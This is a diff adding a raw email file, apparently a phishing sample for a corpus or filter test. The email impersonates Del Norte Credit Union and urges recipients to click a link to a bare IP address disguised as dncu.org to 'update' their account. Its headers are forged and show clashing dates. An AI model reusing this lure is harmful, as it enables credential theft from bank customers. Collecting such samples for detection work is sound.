@@ -1,0 +1,54 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <security@dncu.org>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id EEF5146904
+ for <user@login.example.com>; Sun, 27 May 2007 23:35:05 -0400 (EDT)
+X-Greylist: delayed 119 seconds by postgrey-1.27 at mail.example.org;
+ Sun, 27 May 2007 23:35:05 EDT
+Received: from fmforwarding.com (unknown [65.66.177.234])
+ by mail.example.org (Postfix) with ESMTP id D106C131FB58
+ for <user@example.com>; Sun, 27 May 2007 23:35:05 -0400 (EDT)
+Received: from User [83.235.55.10] by fmforwarding.com with ESMTP
+ (SMTPD32-5.00) id A17418100250; Wed, 17 May 2006 15:03:00 CST
+From: "Del Norte Credit Union"<security@dncu.org.>
+Subject: New security system Del Norte Credit Union !
+Date: Thu, 17 May 2007 23:28:48 +0300
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <200605171503.SM00194@User>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1323
+
+<html>
+<title>notice</title>
+<p><img border="0" src="http://awni2.clearmedia.be/monarch/delnorte.gif"></p>
+<p><font face="Arial" size="2"><span class="treb"> <br>
+<br>
+Due to the recent phishing attacks targeting Del Norte Credit Union we are 
+currently launching<Br>
+ a new security system that will improve
+the level of member service we can provide to you.<br>
+In order to update your account and benefit from new facilities, click
+<a href="http://59.15.124.86:84/www.dncu.org/">here</a>.</span></font></p>
+<p><span style="font-family: Arial"><font size="2">To enhance the security when 
+accessing your on-line accounts, Del Norte Credit Union has<Br> implemented an 
+additional layer to our on-line security system. <Br>You may be requested to answer 
+security questions in order to complete your log in to DNCU Online Banking.</font></span><font face="Arial" size="2"><span class="treb"><br>
+<br>
+<b>Failure to authenticate your account may result in account malfunction, <br>slow 
+online experience or even exposure of sensible data.<br></b><br>
+Please do not reply to this message. For any inquiries, contact Member Service. <br>
+<br>
+</span>Copyright © 2007 Del Norte Credit Union. All rights reserved.</font></p>
+</html>
